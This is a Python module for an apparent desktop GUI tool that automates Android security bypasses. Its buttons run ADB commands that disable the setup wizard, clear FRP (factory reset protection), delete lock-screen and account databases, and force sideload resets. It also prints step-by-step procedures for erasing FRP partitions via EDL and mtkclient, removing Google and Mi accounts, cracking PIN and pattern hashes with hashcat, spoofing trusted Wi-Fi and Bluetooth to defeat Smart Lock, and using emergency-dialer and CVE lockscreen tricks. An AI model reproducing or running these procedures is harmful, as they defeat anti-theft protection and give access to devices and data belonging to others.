# language: Python, file: modules/android_bypass.py
# Android FRP / lockscreen / pattern / Samsung / Xiaomi / ADB bypass suite
import customtkinter as ctk
import threading
import subprocess
import os
import time
from utils.progress import ProgressTracker


class AndroidBypassModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "android_bypass"
        self.progress = ProgressTracker(log_queue)

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="ANDROID BYPASS",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="FRP · lockscreen · pattern · Samsung · Xiaomi · MTK · QC",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)

        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)
        self.device = ctk.CTkEntry(r1, placeholder_text="device (serial / auto)",
                                    width=200, height=32,
                                    fg_color="#05080c", border_color="#1a2332")
        self.device.pack(side="left", padx=(0, 6))
        self.vendor = ctk.CTkOptionMenu(
            r1, values=["auto", "samsung", "xiaomi", "huawei", "oppo", "vivo",
                        "oneplus", "pixel", "realme", "motorola", "lg", "sony",
                        "tecno", "infinix", "itel", "generic"],
            width=140, fg_color="#1a2332", button_color="#1a2332")
        self.vendor.pack(side="left", padx=(0, 6))
        self.android_ver = ctk.CTkOptionMenu(
            r1, values=["auto", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15"],
            width=100, fg_color="#1a2332", button_color="#1a2332")
        self.android_ver.pack(side="left", padx=(0, 6))
        self.mode = ctk.CTkOptionMenu(
            r1, values=["frp", "lock", "pattern", "knox", "sideload", "adb"],
            width=120, fg_color="#1a2332", button_color="#1a2332")
        self.mode.pack(side="left")

        # ---- actions ----
        ctk.CTkLabel(parent, text="Bypass operations:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")

        grid = ctk.CTkFrame(parent, fg_color="transparent")
        grid.pack(fill="x", padx=24)

        actions = [
            ("▸ Detect device", self._detect),
            ("▸ FRP bypass (ADB)", self._frp_adb),
            ("▸ FRP bypass (TalkBack)", self._frp_talkback),
            ("▸ FRP bypass (Samsung)", self._frp_samsung),
            ("▸ FRP bypass (Xiaomi)", self._frp_xiaomi),
            ("▸ FRP bypass (MTK)", self._frp_mtk),
            ("▸ FRP bypass (Qualcomm)", self._frp_qc),
            ("▸ Lockscreen bypass (ADB)", self._lock_adb),
            ("▸ Pattern bypass (file)", self._pattern_file),
            ("▸ Samsung lockscreen reset", self._samsung_lock),
            ("▸ Knox bypass", self._knox_bypass),
            ("▸ Reset via recovery (adb)", self._recovery_reset),
            ("▸ Sideload factory reset", self._sideload_reset),
            ("▸ Screen lock exploit (CVE)", self._cve_lock),
            ("▸ Smart Lock trick", self._smart_lock),
            ("▸ Emergency call exploit", self._emergency_exploit),
            ("▸ Setup wizard skip", self._skip_setup),
            ("▸ Google account remove", self._gacc_remove),
            ("▸ Mi account remove", self._mi_account),
            ("▸ Bootloader unlock", self._bl_unlock),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                grid, text=label, width=220, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 4, column=i % 4, padx=4, pady=4)

        self.bars = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        self.bars.pack(fill="x", padx=24, pady=(12, 0))

        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=280
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

        self._poll_bars()

    def _poll_bars(self):
        for w in self.bars.winfo_children():
            w.destroy()
        for tid, t in list(self.progress.snapshot().items())[:5]:
            row = ctk.CTkFrame(self.bars, fg_color="transparent")
            row.pack(fill="x", padx=8, pady=2)
            ctk.CTkLabel(row, text=t["label"][:45], width=300, anchor="w",
                         font=ctk.CTkFont(size=10),
                         text_color="#c8d6e5").pack(side="left")
            b = ctk.CTkProgressBar(row, width=200, height=10,
                                   progress_color="#00ff9c")
            b.set(0.5 if t["status"] == "running" else 1.0)
            b.pack(side="left", padx=(0, 8))
            ctk.CTkLabel(row, text=t.get("detail", "")[:60],
                         font=ctk.CTkFont(size=9),
                         text_color="#4a5568").pack(side="left")
        self.bars.after(500, self._poll_bars)

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    def _run(self, cmd, tag="adb"):
        self.log.put(f"[{tag}] {cmd}")
        try:
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in p.stdout:
                self._out(line.rstrip())
                self.log.put(f"[{tag}] {line.rstrip()}")
            p.wait()
        except Exception as e:
            self._out(f"[!] {e}")

    # ==================== detection ====================
    def _detect(self):
        self._out("=== Device detection ===\n")
        self._run("adb devices -l")
        self._run("adb shell getprop ro.product.model", "adb")
        self._run("adb shell getprop ro.product.manufacturer", "adb")
        self._run("adb shell getprop ro.build.version.release", "adb")
        self._run("adb shell getprop ro.build.version.sdk", "adb")
        self._run("adb shell getprop ro.boot.hardware", "adb")
        self._run("adb shell getprop ro.serialno", "adb")
        self._run("adb shell getprop ro.crypto.state", "adb")
        self._run("adb shell getprop ro.boot.verifiedbootstate", "adb")
        self._run("adb shell getprop ro.boot.flash.locked", "adb")
        self._run("fastboot devices", "fastboot")
        self._run("adb shell settings get secure android_id", "adb")

    # ==================== FRP ====================
    def _frp_adb(self):
        """FRP bypass via ADB shell (works when ADB is enabled at setup)"""
        self._out("=== FRP bypass via ADB ===\n")
        cmds = [
            # clear FRP partition
            "adb shell am start -n com.google.android.gms/.auth.uiflows.minutemaid.MinuteMaidActivity",
            # disable setup wizard
            "adb shell pm disable-user --user 0 com.google.android.setupwizard",
            "adb shell pm disable-user --user 0 com.google.android.gms.setup",
            # skip setup
            "adb shell settings put global device_provisioned 1",
            "adb shell settings put secure user_setup_complete 1",
            "adb shell settings put secure user_setup_personalization_state 1",
            "adb shell settings put global setup_wizard_has_run 1",
            # remove FRP
            "adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1",
        ]
        for c in cmds:
            self._run(c)
        self._out("[+] FRP state cleared via ADB")

    def _frp_talkback(self):
        self._out("""
=== FRP bypass via TalkBack (accessibility) ===
Manual steps (no ADB required):
1. On setup screen, enable TalkBack: 2-finger long-press on screen
2. Draw L gesture to open TalkBack menu
3. "Accessibility settings" → "TalkBack settings"
4. Use Google Assistant (Voice) to open Chrome
5. In Chrome URL bar: download QuickShortcutMaker or Settings app
6. Settings → Apps → Chrome → open → download FRP bypass tool (e.g. FRP Bypass APK)
7. Run tool → opens settings → remove Google account
8. Continue setup

Steps vary by Android version (5-12 typical). Android 13+ removed many entry points.

Two-persian-keyboard method (Android 11-12):
  - Language: add Persian → gesture on "zwnj" key → open keyboard settings → navigate to Chrome

Emergency call → *#*#4636#*#* → phone info → some versions open Settings.
""")

    def _frp_samsung(self):
        self._out("""
=== Samsung FRP bypass ===

Method A — ADB enabled (pre-Android 9):
  adb shell am start -n com.google.android.gms/.auth.uiflows.minutemaid.MinuteMaidActivity
  adb shell settings put global device_provisioned 1
  adb shell settings put secure user_setup_complete 1

Method B — Combination file (Knox-based):
  1. Flash combination firmware matching model (e.g. SM-G991U_COMBINATION)
  2. Odin → AP slot → flash
  3. Device boots to factory mode
  4. Enable ADB in factory mode, run FRP bypass commands
  5. Flash original firmware (HOME_CSC to keep data)

Method C — Odin FRP bypass:
  1. Download matching 4-file firmware (AP/BL/CP/CSC_HOME)
  2. Odin → AP only → flash
  3. When done, do not reboot
  4. FRP bypass tool (SamFirm / Odin flash helper)

Method D — Test Point / ISP (hardware):
  1. Open device, locate test points
  2. Use JTAG / eMMC programmer (EasyJTAG, Medusa)
  3. Direct write to /frp partition (zero out)
  4. Works on any Android version, needs hardware

Method E — Sim card trick (older):
  - Insert SIM, click "Emergency" → call random number
  - During call: 3-dot menu → Message → URL
  - Open browser via URL → download FRP bypass tool
""")

    def _frp_xiaomi(self):
        self._out("""
=== Xiaomi FRP bypass ===

Method A — Mi Account lock (recovery):
  1. Boot to fastboot (Vol Down + Power)
  2. fastboot oem unlock-go     # if BL unlocked
  3. Reboot to recovery
  4. Wipe data / factory reset from recovery (some models)
  5. On setup, Mi account may ask — skip via EDL

Method B — EDL (Emergency Download) 9008:
  1. Short test points or use EDL cable
  2. Device appears as Qualcomm 9008 in lsusb
  3. Use Mi Flash Tool / QFIL
  4. Flash mi_account_clear.img to erase account partition
  5. Reboot — account removed

Method C — Vendor tool:
  - Using XiaoMiTool v2 (community)
  - Or UnlockTool (paid) — supports most Xiaomi

Method D — ADB (if setup wizard allows):
  adb shell pm disable-user --user 0 com.miui.cloudservice
  adb shell pm disable-user --user 0 com.xiaomi.account
  adb shell settings put secure user_setup_complete 1
  adb shell settings put global device_provisioned 1
""")

    def _frp_mtk(self):
        self._out("""
=== MediaTek FRP bypass (bootrom / preloader) ===

MTK devices expose bootrom on:
  - Power + Vol Up + Vol Down (varies)
  - Test point short
  - MTKClient via USB

Tool: mtkclient (open source)
  git clone https://github.com/bkerler/mtkclient
  pip install -r requirements.txt

Steps:
  1. Power off device
  2. Hold Vol Up + Vol Down + connect USB
  3. python mtk r frp frp.bin
  4. python mtk w frp empty_frp.bin     # zero file
  5. Reboot

Or: full unlock
  python mtk da seccfg unlock

Works on: MT67xx, MT68xx, MT81xx chips — most Chinese/Indian phones.
""")

    def _frp_qc(self):
        self._out("""
=== Qualcomm FRP bypass ===

EDL mode (9008):
  1. Test points on motherboard OR EDL cable
  2. Device appears as QDLoader 9008
  3. Use QFIL / QPST / XiaoMiFlash
  4. Load firehose programmer (model specific .mbn)
  5. Erase /frp partition:
     - In QFIL: Tools → Partition Manager → find frp → Erase
  6. Reboot — FRP cleared

Or: edl.py (bkerler)
  pip install edl
  edl printgpt --loader=prog_firehose_ddr.elf
  edl e frp frp.bin
  edl w frp empty.bin

Test points common: two small pads near SoC labeled "EDL" or "TP1/TP2"
Short with tweezers + USB plug = boot to 9008.
""")

    # ==================== Lockscreen ====================
    def _lock_adb(self):
        """remove lockscreen if ADB enabled and device unlocked boot"""
        self._out("=== Lockscreen bypass via ADB ===\n")
        cmds = [
            # delete lock files (requires root)
            "adb shell su -c 'rm /data/system/gesture.key'",
            "adb shell su -c 'rm /data/system/password.key'",
            "adb shell su -c 'rm /data/system/locksettings.db'",
            "adb shell su -c 'rm /data/system/locksettings.db-wal'",
            "adb shell su -c 'rm /data/system/locksettings.db-shm'",
            # non-root alternative — disable lock
            "adb shell locksettings set-disabled true",
            "adb shell locksettings clear --old ''",
            # trigger pattern clear
            "adb shell rm /data/system/users/0/gesture.key",
        ]
        for c in cmds:
            self._run(c)
        self._out("[+] If rooted, lock files removed. Reboot and no PIN required.")

    def _pattern_file(self):
        self._out("""
=== Pattern / PIN file location ===
/data/system/gesture.key              — pattern (SHA1 of pattern bytes)
/data/system/password.key             — PIN/password (salted SHA1)
/data/system/locksettings.db          — Android 7+ (SQLite)
/data/system/users/0/gesture.key      — multi-user
/data/misc/keystore/                  — Android 9+ (encrypted)

Bruteforce: pull hash, crack offline
  - Pattern: 3x3 grid = 389,112 patterns → hashcat mask
  - PIN 4-digit: 10,000 → trivial
  - PIN 6-digit: 1,000,000

hashcat mode: 5800 (Android PIN)
  hashcat -m 5800 -a 3 hash.txt ?d?d?d?d

Salt pattern: <salt>$<hash>
""")

    def _samsung_lock(self):
        self._out("""
=== Samsung lockscreen reset ===

Method A — Find My Mobile (offline? works if enabled pre-lock):
  1. https://findmymobile.samsung.com
  2. Login Samsung account
  3. "Unlock" → remote unlock
  4. Works only if Samsung account bound + device online

Method B — Factory reset via recovery:
  1. Power + Vol Up + Bixby (or Vol Up + Power)
  2. Wipe data / factory reset
  3. Reboot → lock gone, but data lost + FRP triggered

Method C — Combination firmware:
  Flash combination binary, boot to factory test mode
  → Settings app → clear lock

Method D — ADB (if USB debugging previously enabled):
  adb shell locksettings set-disabled true
""")

    def _knox_bypass(self):
        self._out("""
=== Samsung Knox bypass ===
Knox 0x0 → 0x1 flag = warranty void, cannot reset without flashing.
Full Knox bypass = physically replacing eFuse — impractical.

What IS bypassable:
  - Knox Guard (MDM-based) — flash combination file
  - Knox attestation in apps — patch app, not device
  - Knox container — root + mount + delete
  - TIMA/Knox kernel — MagiskHide / Shamiko

Steps for MDM lock (Knox Guard / Samsung Enterprise):
  1. Flash combination (COMBINATION) firmware
  2. Factory test mode → settings
  3. Or: EDL flash full stock firmware
  4. Device reboots to fresh state, MDM gone (Knox 0x1 remains)
""")

    def _recovery_reset(self):
        self._out("""
=== Recovery wipe (data loss) ===
adb reboot recovery
# Or manual: Power + Vol Up + Home

In recovery (stock):
  - Wipe data / factory reset
  - Wipe cache partition
  - Reboot system

In recovery (TWRP — if installed):
  - Mount /data
  - Advanced Wipe → everything except /system, /vendor
  - Or: Format Data → YES → wipes + removes encryption
""")

    def _sideload_reset(self):
        self._run("adb reboot sideload")
        self._run("adb sideload ota_factory_reset.zip")

    def _cve_lock(self):
        self._out("""
=== Lockscreen CVE exploits ===

CVE-2017-13208 — Android media server (LPE, Android 5-8)
CVE-2018-9489 — Google Play Protect bypass
CVE-2020-0096 — "StrandHogg 2.0" task hijack → overlay lockscreen
CVE-2020-0103 — BroadcastAnywhere → unlock bypass (Android 8-9)
CVE-2021-0434 — "Intent Redirection"
CVE-2022-20465 — SIM-swap lockscreen bypass (Pixel, Android 10-13)
  - Insert attacker SIM
  - Call phone, use notification reply
  - Reboot → unlocked (needs physical SIM trick)

CVE-2023-2136 — Skia RCE (browser sandbox escape)
CVE-2024-xxxxx — check Android Security Bulletin monthly

Each is device/version specific. Full chains exist on GitHub.
""")

    def _smart_lock(self):
        self._out("""
=== Smart Lock abuse ===
If Smart Lock (trusted places / devices / face) enabled:
  1. Spoof trusted WiFi: create AP with same SSID + BSSID
     - nmcli dev wifi hotspot ssid "TargetWiFi" band bg channel 6
     - Or hostapd with copied BSSID
  2. Device sees trusted network → auto unlocks without PIN

Spoof trusted Bluetooth:
  - Use Raspberry Pi + BT spoof with MAC of trusted device
  - Or use android-bluetooth-spoof tools

On-body detection bypass:
  - Keep phone in motion when picking it up (walking → stays unlocked)
""")

    def _emergency_exploit(self):
        self._out("""
=== Emergency call lock bypass ===
Various versions exposed entry points via emergency dialer:

Android 5-8 (CVE-2016-...):
  Emergency dial → tap ICE info → some builds opened Contacts → Inbox → URL

Android 9-11:
  Lock screen → Emergency → "ICE Emergency Information" → Edit → 
  Some builds exposed "Add contact" → opened full Contacts → Send email

Android 12+:
  Lock screen → Emergency → Emergency info
  Long-press power → Emergency
  Fixes closed most paths.

Try:
  - Swipe notification → reply → share → other app
  - Google Assistant from lock → "open settings"
  - Bixby from lock → "open developer options"
""")

    def _skip_setup(self):
        self._out("""
=== Skip Setup Wizard ===
adb shell settings put global device_provisioned 1
adb shell settings put secure user_setup_complete 1
adb shell am start -a android.intent.action.MAIN -c android.intent.category.HOME
adb shell pm disable-user --user 0 com.google.android.setupwizard
adb shell pm disable-user --user 0 com.android.provision
""")

    def _gacc_remove(self):
        self._out("""
=== Google Account remove (FRP) ===
adb shell pm list users
adb shell am start -n com.google.android.gms/.auth.uiflows.minutemaid.MinuteMaidActivity
adb shell content delete --uri content://com.google.android.gsf.gservices --where "_id=1"
# Or if root:
adb shell su -c 'rm -rf /data/system/users/0/accounts.db*'
adb shell su -c 'rm -rf /data/system/users/0/accounts_ce.db*'
adb shell su -c 'rm -rf /data/system/users/0/accounts_de.db*'
adb shell su -c 'rm -rf /data/data/com.google.android.gms/databases/*'
""")

    def _mi_account(self):
        self._out("""
=== Mi Account remove ===
adb shell pm disable-user --user 0 com.xiaomi.account
adb shell pm disable-user --user 0 com.miui.cloudservice
adb shell pm clear com.miui.cloudservice
adb shell settings put secure user_setup_complete 1
adb shell settings put global device_provisioned 1

Or via EDL: erase /persist and /frp partitions, then flash factory image.
""")

    def _bl_unlock(self):
        self._out("""
=== Bootloader unlock ===

Xiaomi:
  1. Mi Unlock app — wait 7-360 hours after Mi account bind
  2. fastboot oem unlock-go

Google Pixel:
  fastboot flashing unlock
  fastboot flashing unlock_critical

OnePlus:
  fastboot oem unlock
  Or: fastboot flashing unlock

Samsung (Exynos):
  Settings → Developer → OEM unlock → Download mode → long press Vol Up

Samsung (Snapdragon US):
  NO official unlock. Only via third-party paid services (unlocktool etc.)

Generic MTK:
  python mtk da seccfg unlock

Huawei:
  Closed since 2018. Paid unlock codes only via 3rd party.

Bootloader unlock = full device wipe (mandatory security).
""")

    # ==================== helpers ====================
    def _device_arg(self):
        d = self.device.get().strip()
        return f"-s {d}" if d else ""
